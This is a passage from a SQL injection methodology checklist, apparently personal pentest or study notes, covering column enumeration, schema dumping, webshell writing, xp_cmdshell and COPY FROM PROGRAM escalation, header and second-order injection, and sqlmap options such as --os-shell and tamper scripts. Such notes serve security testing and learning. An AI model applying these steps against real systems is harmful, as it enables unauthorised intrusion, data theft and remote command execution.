   - ORDER BY 1,2,3... until error
   - Find printable column (UNION SELECT 'a',NULL...)

5. Enumerate
   - @@version / user() / database()
   - information_schema.schemata → tables → columns
   - Target table dump

6. Escalate
   - Check FILE privilege + secure_file_priv
   - Write webshell if writable web root
   - MSSQL: try xp_cmdshell
   - PostgreSQL: try COPY FROM PROGRAM

7. Don't forget non-param injection points
   - HTTP headers: User-Agent, X-Forwarded-For, Referer
   - sqlmap --level=3+ to auto-test headers
   - JSON body fields

8. If input is stored (registration, profile, etc.)
   - Test second-order SQLi — trigger via secondary feature
   - sqlmap --second-url for automated testing

9. If MSSQL or PostgreSQL — try stacked queries
   - '; SELECT SLEEP(5)-- - to confirm
   - Chain xp_cmdshell enable + exec in one payload

10. Automate with sqlmap
    - --batch for non-interactive
    - -r request.txt from Burp
    - --os-shell for interactive access
    - Add tamper scripts if WAF present
```

> For NoSQL injection (MongoDB, Redis, CouchDB) see [[NoSQL Injection]]

---

*Created: 2026-02-27*
*Updated: 2026-09-02*
*Model: claude-opus-5*
